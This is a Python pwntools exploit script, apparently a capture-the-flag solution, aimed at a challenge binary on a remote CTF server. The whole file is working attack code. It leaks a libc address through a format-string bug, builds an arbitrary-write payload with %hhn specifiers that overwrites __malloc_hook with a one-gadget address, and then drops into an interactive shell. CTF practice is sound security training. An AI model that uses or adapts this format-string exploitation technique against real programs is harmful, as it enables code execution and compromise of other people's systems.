#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./main"
elf=ELF(pwn_file)
libc=elf.libc

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22015)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()
'''
思路:
    1. 泄露libc地址
    2. 定义构造攻击字符串的函数，给定地址、值和index，可以值写入
    3. 修改malloc_hook值，当输出较多值时，会自动调用molloc
'''
def generate_str(pos,inject_value, index):
    inject_str = ''
    
    payload_size = 0x100
    index_plus = payload_size/8
    val_all = 0
    for i in range(8):
      val = (inject_value>>(i*8))%0x100
      print hex(val)
      while val < val_all:
         val += 0x100

      val_inj = val - val_all
      val_all = val%0x100
      if i==7:
        inject_str += "%{}c%{}$hhn".format('256', index + index_plus + i)
      else:
        inject_str += "%{}c%{}$hhn".format(str(val_inj), index + index_plus + i)
    inject_str += '\x00'
    inject_str += '\x00'*(payload_size - len(inject_str))

    for i in range(8):
      inject_str += p64(pos + i) 
    return inject_str

# leak libc
payload1 = "%31$lx"
r.sendline(payload1)
w = r.recvline()
libc_o = 0x7ffff7de164b - 0x7ffff7dd7000 + 0x7faea71ea000 - 0x7faea6e20000
libc.address = int(w,16) - libc_o

# get inject_str

inject_pos = libc.sym["__malloc_hook"]
inject_value = libc.address + 0x4526a
index =  8
payload2 = generate_str(inject_pos, inject_value, index)
print hex(inject_value)
print hex(libc.address)
print hex(inject_pos)


r.sendline(payload2)

debug()
#debug()
r.interactive()
